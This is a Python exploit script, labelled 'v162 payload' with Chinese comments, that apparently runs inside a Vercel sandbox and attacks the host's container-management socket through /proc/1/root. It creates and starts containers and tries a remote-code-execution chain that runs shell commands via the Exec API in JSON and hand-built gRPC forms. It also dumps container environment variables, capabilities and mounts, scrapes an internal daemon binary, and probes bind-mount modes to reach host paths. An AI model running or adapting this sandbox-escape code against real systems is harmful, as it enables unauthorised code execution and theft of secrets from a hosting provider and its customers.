# -*- coding: utf-8 -*-
"""v162 payload: Create+Start 容器进程验证 + Exec/StreamOutput RCE 链 + Mount mode
输出 /vercel/sandbox/v162c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v162c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def raw_grpc(sockpath, path, msg, t=5.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        body = b'\x00' + struct.pack('>I', len(msg)) + msg
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'TE: trailers\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        gs = re.search(rb'grpc-status: (\d+)', d)
        gm = re.search(rb'grpc-message: ([^\r\n]+)', d)
        return st, d[hdr_end + 4:hdr_end + 4 + 800] if hdr_end > 0 else b'', \
            gs.group(1).decode() if gs else '', gm.group(1).decode(errors='replace') if gm else ''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', '', ''


def fstr(field_no, s):
    return bytes([field_no << 3 | 2]) + bytes([len(s)]) + s.encode()


def fmsg(field_no, inner):
    return bytes([field_no << 3 | 2]) + bytes([len(inner)]) + inner


def fvarint(field_no, v):
    out = bytes([field_no << 3])
    while v >= 128:
        out += bytes([(v & 127) | 128])
        v >>= 7
    return out + bytes([v])


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:100].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: Create cmd=sleep + Start ============
log('=== 1 create sleep ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'sleep'}).encode(), t=8)
log('Create sleep -> %s %r' % (st, pay[:300]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
log('Start -> %s %r' % (st2, pay2[:300]))
time.sleep(1.5)

# 找容器进程 (sleep 应该出现)
found = find_proc(['sleep'])
if found:
    pid, comm, cl = found
    log('!!! container proc pid=%s comm=%s cmd=%s' % (pid, comm, cl))
    # 容器进程详情
    try:
        st_ = open('/proc/%s/status' % pid).read()
        for ln in st_.splitlines():
            if ln.startswith(('CapEff:', 'CapBnd:', 'Seccomp:', 'NoNewPrivs:', 'Uid:', 'Gid:', 'NSpid:', 'PPid:')):
                log('CTRP %s' % ln)
    except Exception as e:
        log('status EXC %s' % e)
    # 容器 mountinfo
    try:
        for ln in open('/proc/%s/mountinfo' % pid).read().splitlines()[:30]:
            log('CTRM %s' % ln[:220])
    except Exception as e:
        log('CTRM EXC %s' % e)
    # 容器环境变量
    try:
        env = open('/proc/%s/environ' % pid).read().replace('\x00', '\n')
        log('CTRE %s' % env[:1200])
    except Exception as e:
        log('CTRE EXC %s' % e)
    # 容器 root
    try:
        for e in sorted(os.listdir('/proc/%s/root' % pid))[:30]:
            log('CTRR /%s' % e)
    except Exception as e:
        log('CTRR EXC %s' % e)
    # 容器 cgroup
    try:
        log('CTRC %s' % open('/proc/%s/cgroup' % pid).read()[:600])
    except Exception as e:
        log('CTRC EXC %s' % e)
else:
    log('NO sleep proc found!')
    # runc dirs
    try:
        for e in sorted(os.listdir(R + '/run/cell/runc')):
            log('runc dir %s' % e)
    except Exception:
        pass

# ============ 2: Exec 尝试 ============
log('=== 2 exec ===')
if cid:
    # JSON Exec
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh',
                                   'arguments': ['-c', 'id > /tmp/v162exec; env >> /tmp/v162exec; echo EXECOK']}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=8)
    log('JSON Exec -> %s %r' % (st3, pay3[:300]))
    # gRPC Exec
    proc = fstr(1, '/bin/sh') + fmsg(2, fstr(1, '-c') + fstr(2, 'id > /tmp/v162exec2; echo EXECOK2 >> /tmp/v162exec2'))
    req = fstr(1, cid) + fmsg(2, proc)
    st4, pay4, gs4, gm4 = raw_grpc(CELL, '%s/Exec' % CTRS, req, t=8)
    log('gRPC Exec -> %s gs=%s gm=%s %r' % (st4, gs4, gm4, pay4[:300]))
    time.sleep(1)
    # 检查容器进程视角的文件
    found = find_proc(['sleep'])
    if found:
        pid = found[0]
        for p in ['/proc/%s/root/tmp/v162exec' % pid, '/proc/%s/root/tmp/v162exec2' % pid]:
            try:
                d = open(p).read()
                log('EXECFILE %s=%r' % (p, d[:500]))
            except Exception as e:
                log('EXECFILE %s ERR %s' % (p, type(e).__name__))
    # StreamOutput
    for stream_v in [0, 1, 2]:
        req = fstr(1, cid) + fvarint(2, stream_v)
        st5, pay5, gs5, gm5 = raw_grpc(CELL, '%s/StreamOutput' % CTRS, req, t=6)
        log('StreamOutput stream=%d -> %s gs=%s gm=%s %r' % (stream_v, st5, gs5, gm5, pay5[:300]))

# ============ 3: Mount mode 枚举提取 ============
log('=== 3 mountmode ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    idx = data.find(b'types/mount.proto')
    if idx > 0:
        seg = data[idx - 200:idx + 3000]
        # 找 MountMode 枚举
        for m in re.finditer(rb'[\x20-\x7e]{4,}', seg):
            s = m.group().decode(errors='replace')
            if 'Mode' in s or 'mode' in s or 'MOUNT' in s.upper():
                log('MM %s' % s)
except Exception as e:
    log('MM EXC %s' % e)

# ============ 4: Mount 带 mode ============
log('=== 4 mount mode ===')
if cid:
    for mode in ['READ_WRITE', 'MOUNT_MODE_READ_WRITE', 'MOUNT_MODE_READ_ONLY', 'READ_ONLY', 1, 2, 'RW', 'RO']:
        st6, pay6 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid,
                                        'mounts': [{'bind': {'source': '/tmp', 'destination': '/mnt/x', 'mode': mode}}]}).encode(), t=5)
        if 'invalid_argument' not in pay6.decode(errors='replace'):
            log('Mount mode=%r -> %s %r' % (mode, st6, pay6[:300]))
        else:
            log('Mount mode=%r -> %s' % (mode, st6))

# ============ 5: Kill 测试 ============
log('=== 5 kill ===')
if cid:
    st7, pay7 = raw_req(CELL, '%s/Kill' % CTRS, json.dumps({'container_id': cid}).encode(), t=5)
    log('Kill -> %s %r' % (st7, pay7[:200]))
    time.sleep(0.5)
    found = find_proc(['sleep'])
    log('after kill sleep proc: %s' % (found if found else 'GONE'))

log('V162_DONE')
f.close()
